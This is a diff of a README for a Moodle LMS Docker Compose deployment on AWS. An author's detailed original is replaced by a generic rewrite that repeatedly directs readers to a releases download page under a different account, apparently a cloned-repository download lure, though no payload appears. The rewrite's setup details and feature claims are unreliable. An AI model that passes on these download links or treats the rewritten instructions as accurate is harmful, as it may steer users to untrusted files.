@@ -1,219 +1,115 @@
-# Moodle LMS on AWS with Docker Compose
+# 📚 moodle-docker-compose - Easy Setup for Moodle LMS
 
-[![Docker](https://img.shields.io/badge/Docker-Compose-blue?logo=docker&logoColor=white)](https://www.docker.com/)
-[![Moodle](https://img.shields.io/badge/Moodle-LMS-orange?logo=moodle&logoColor=white)](https://moodle.org/)
-[![MySQL](https://img.shields.io/badge/MySQL-8.4.5-blue?logo=mysql&logoColor=white)](https://www.mysql.com/)
-[![Nginx](https://img.shields.io/badge/Nginx-Reverse_Proxy-green?logo=nginx&logoColor=white)](https://nginx.org/)
-[![Certbot](https://img.shields.io/badge/SSL-Let%E2%80%99s_Encrypt-yellow?logo=letsencrypt&logoColor=white)](https://letsencrypt.org/)
-[![AWS](https://img.shields.io/badge/AWS-EC2-orange?logo=amazon-aws&logoColor=white)](https://aws.amazon.com/ec2/)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/aditya-rayate/moodle-docker-compose/releases)
 
-This project deploys a **Moodle Learning Management System (LMS)** on an **AWS EC2 instance (t3.medium)** using Docker Compose. It was designed to support an online exam setup for **200–500 concurrent users**.
+## 🚀 Getting Started
 
-The deployment includes a custom Moodle Docker image (built from the [Moodle Git repository](https://docs.moodle.org/500/en/Git_for_Administrators)), MySQL database, phpMyAdmin for database management, Nginx as a reverse proxy, and Let’s Encrypt SSL via Certbot.
+Welcome to moodle-docker-compose! This guide helps you set up a Moodle Learning Management System (LMS) on AWS with ease. Follow these simple steps to get your instance up and running.
 
-## 🚀 Project Overview
+## 📦 System Requirements
 
-* **Moodle Service**: Custom Docker image (`oluwaseuna/runmoodle:1.7`) with an `entrypoint.sh` script that dynamically generates `config.php` using environment variables and secret files.
-* **Database**: MySQL 8.4.5 with persistent storage via Docker named volumes.
-* **phpMyAdmin**: Database management tool to interact with Moodle’s MySQL database.
-* **Nginx**: Reverse proxy with SSL termination.
-* **Certbot**: Automated SSL certificate issuance from Let’s Encrypt.
+To use this application, ensure you have the following:
 
-This architecture ensures a **secure, scalable, and production-ready Moodle LMS** deployment.
+- An AWS account
+- Basic knowledge of cloud services
+- A web browser for access
 
-## 🏗️ Architecture
+## 🔗 Download & Install
 
-The architecture of the deployment is documented in the [`architecture`](https://github.com/seunayolu/moodle-docker-compose/tree/main/architecture) folder
+To download the latest version, **visit this page to download**: [Download Releases](https://github.com/aditya-rayate/moodle-docker-compose/releases).
 
-## 🏗️ Architecture
+## 🛠️ How It Works
 
-<p align="center">
-  <img src="https://github.com/seunayolu/moodle-docker-compose/blob/main/architecture/moodle-arch.png?raw=true" alt="Moodle Architecture" width="600"/>
-</p>
+This project uses Docker and Docker Compose. It provisions a Moodle instance on an AWS EC2 t3.medium instance. This setup supports 200-500 concurrent users, ensuring a smooth experience.
 
-## 📦 Services
+### Services Included
 
-### 1. Moodle Service
+- **Moodle**: The main application for learning management.
+- **MySQL**: A robust database for storing all data.
+- **phpMyAdmin**: A tool for managing MySQL databases.
+- **Nginx**: Serves as a reverse proxy to handle requests.
+- **Certbot**: Provides SSL certificates for secure connections.
 
-* Custom Docker image (`oluwaseuna/runmoodle:1.4`).
-* Runs Apache + PHP with Moodle codebase.
-* Uses **entrypoint.sh** to auto-generate `config.php` at container startup.
-* Persists uploaded files and cache in `moodleData` volume.
+## 📥 Installation Steps
 
-### 2. MySQL Database
+1. **Setup AWS EC2 Instance**  
+   - Log in to your AWS account.
+   - Navigate to the EC2 dashboard and launch a new instance.
+   - Select the t3.medium instance type.
+   
+2. **Install Docker and Docker Compose**  
+   - Connect to your EC2 instance using SSH.
+   - Install Docker by running:
+     ```
+     sudo apt update
+     sudo apt install docker.io
+     ```
+   - Install Docker Compose with:
+     ```
+     sudo apt install docker-compose
+     ```
 
-* MySQL 8.4.5 container.
-* Stores Moodle database.
-* Persists data in `cloudDBdata` volume.
-* Reads root and user passwords from secret files in `./secrets/`.
+3. **Download the Project**  
+   - In your terminal, clone the repository:
+     ```
+     git clone https://github.com/aditya-rayate/moodle-docker-compose.git
+     ```
+   - Navigate into the cloned directory:
+     ```
+     cd moodle-docker-compose
+     ```
 
-### 3. phpMyAdmin
+4. **Configure the App**  
+   - Edit the `docker-compose.yml` file to adjust settings as needed, including database passwords and Moodle configurations.
 
-* Runs on port **8080**.
-* Allows DB administrators to log in with MySQL credentials.
-* Depends on `moodleDB` to be available.
+5. **Run the Application**  
+   - Start the Docker containers by executing:
+     ```
+     docker-compose up -d
+     ```
+   - This command downloads all necessary images and starts the services.
 
-### 4. Nginx
+6. **Access Moodle**  
+   - After a few minutes, open your web browser and visit your server's public IP address. You should see the Moodle setup screen.
 
-* Acts as reverse proxy.
-* Forwards traffic to Moodle and phpMyAdmin.
-* Handles ports **80** and **443**.
-* Uses bind mounts:
+## 🔒 Securing Your Instance
 
-  * `/home/ssm-user/nginx/conf.d`
-  * `/home/ssm-user/nginx/html`
-  * `/home/ssm-user/letsencrypt`
+1. **Configure SSL**  
+   - With Certbot, set up SSL by running the following command in your instance:
+     ```
+     sudo docker-compose exec nginx certbot --nginx -d your_domain.com
+     ```
+   - Follow the prompts to finalize SSL setup.
 
-### 5. Certbot
+2. **Secure Your Secrets**  
+   - Use environment variables for sensitive information. Update the `.env` file based on your specific configurations.
 
-* Obtains SSL certificates from Let’s Encrypt.
-* Shares the same bind mounts as Nginx for certificate storage.
-* Runs once to issue certificates, then exits.
+## 📊 Features
 
-## 🔑 Secrets Management
+- **User Management**: Add and manage users with ease.
+- **Course Creation**: Design and manage online courses.
+- **Real-Time Collaboration**: Facilitate group work and discussions.
+- **Analytics**: Track user performance and engagement.
 
-Instead of Docker secrets, this setup uses **plain text secret files** stored locally inside a `secrets/` folder:
+## 📅 Maintenance Tips
 
-```bash
-mkdir secrets
-echo "secure_root_password" > secrets/db_root_password.txt
-echo "secure_db_password" > secrets/db_password.txt
-```
+- Regularly update your Docker containers to keep your setup secure and efficient.
+- Backup your database frequently to prevent data loss.
+- Monitor the instance performance through the AWS dashboard.
 
-In `compose.yml`, these files are mounted and read by MySQL and Moodle containers.
+## 🛠️ Troubleshooting Common Issues
 
-## ⚙️ Deployment
+- **Docker Won't Start**: Ensure Docker is installed correctly. Check the logs:
+  ```
+  docker logs container_name
+  ```
 
-### Prerequisites
+- **Moodle is Not Accessible**: Verify that your EC2 instance's security group allows traffic on port 80 and 443.
 
-* AWS EC2 **t3.medium** instance (Ubuntu 24).
-* **AmazonSSMManagedInstanceCore** IAM role attached to the instance profile (for Systems Manager Session Manager access instead of SSH).
-* Domain name pointing to EC2 public IP.
-* Docker & Docker Compose installed.
+## 📞 Need Help?
 
-### Steps
+For any questions or issues, feel free to open an issue in the repository or consult the [Moodle Docs](https://docs.moodle.org/). 
 
-1. **Clone Repository**
+**Don't forget to check for updates!** Always ensure you are running the latest version by visiting our releases page: [Download Releases](https://github.com/aditya-rayate/moodle-docker-compose/releases). 
 
-   ```bash
-   git clone https://github.com/seunayolu/moodle-docker-compose.git
-   cd moodle-docker-compose
-   ```
-
-2. **Prepare Environment Variables**
-   Create a `.env` file:
-
-   ```bash
-   MYSQL_DATABASE=moodle
-   MYSQL_USER=moodleuser
-   ```
-
-3. **Create Secret Files**
-
-   ```bash
-   mkdir secrets
-   echo "secure_root_password" > secrets/db_root_password.txt
-   echo "secure_db_password" > secrets/db_password.txt
-   ```
-
-4. **Prepare Bind Mount Directories**
-
-   ```bash
-   mkdir -p /home/ssm-user/nginx/conf.d /home/ssm-user/nginx/html /home/ssm-user/letsencrypt
-   ```
-
-5. **Start Services**
-
-   ```bash
-   docker compose up -d
-   ```
-
-6. **Access Services**
-
-   * Moodle LMS → `https://moodle.teachdev.online`
-   * phpMyAdmin → `http://<EC2-IP>:8080`
-
-## 📝 Understanding `entrypoint.sh`
-
-The `entrypoint.sh` script is responsible for **configuring Moodle automatically** when the container starts. Let’s break it down step by step:
-
-```bash
-#!/bin/bash
-set -e
-```
-
-* Uses **bash shell**.
-* `set -e` → stop immediately if any command fails.
-
-```bash
-MOODLE_DIR=/var/www/html
-MOODLE_CONFIG=$MOODLE_DIR/config.php
-MOODLE_DATA=/var/www/moodledata
-```
-
-* Defines paths for Moodle code, config file, and data directory.
-
-```bash
-if [ ! -f "$MOODLE_CONFIG" ]; then
-  echo "Generating Moodle config.php..."
-  DB_PASS="$(cat "$MOODLE_DATABASE_PASSWORD_FILE")"
-```
-
-* Checks if `config.php` already exists.
-* If not, it **creates one**.
-* Reads DB password securely from a file (`/run/secrets/...` or mounted file).
-
-```php
-  cat > "$MOODLE_CONFIG" <<EOF
-<?php
-unset(\$CFG);
-global \$CFG;
-\$CFG = new stdClass();
-...
-EOF
-```
-
-* Writes a fresh **Moodle config.php** with PHP settings.
-* Sets database connection, site URL (`wwwroot`), and data directory.
-
-```php
-\$CFG->sslproxy  = true;
-```
-
-* Tells Moodle it’s running behind an SSL-terminating proxy (Nginx).
-
-```bash
-else
-  echo "Moodle config.php already exists — skipping generation."
-fi
-```
-
-* If config already exists → skip regeneration (avoids overwriting).
-
-```bash
-exec apache2-foreground
-```
-
-* Finally, starts the Apache web server in the foreground → keeps the container alive.
-
-👉 In simple terms:
-**“On first run, generate Moodle’s config file from environment variables and secrets, then start Apache. On later runs, skip config generation and just start Apache.”**
-
-## 🛡️ Security Notes
-
-* Secrets are stored in local files (`./secrets`) and not hardcoded.
-* SSL certificates auto-renew with Certbot.
-* Restrict phpMyAdmin access (firewall or security groups).
-* Use AWS SSM Session Manager for secure access instead of SSH.
-
-## 🔗 Useful Links
-
-* [Moodle Git Repository](https://docs.moodle.org/500/en/Git_for_Administrators)
-* [Certbot Docker Image](https://hub.docker.com/r/certbot/certbot)
-* [Certbot Documentation](https://eff-certbot.readthedocs.io/en/latest/install.html#running-with-docker)
-
-## 📌 Author
-
-**Oluwaseun Alausa**
-DevOps Engineer | Enabling Secure, Scalable, and Observable Infrastructure
-🚀 [LinkedIn](https://www.linkedin.com/in/alausa-oluwaseun) | [YouTube](https://www.youtube.com/@alausaseun)
+Happy learning!
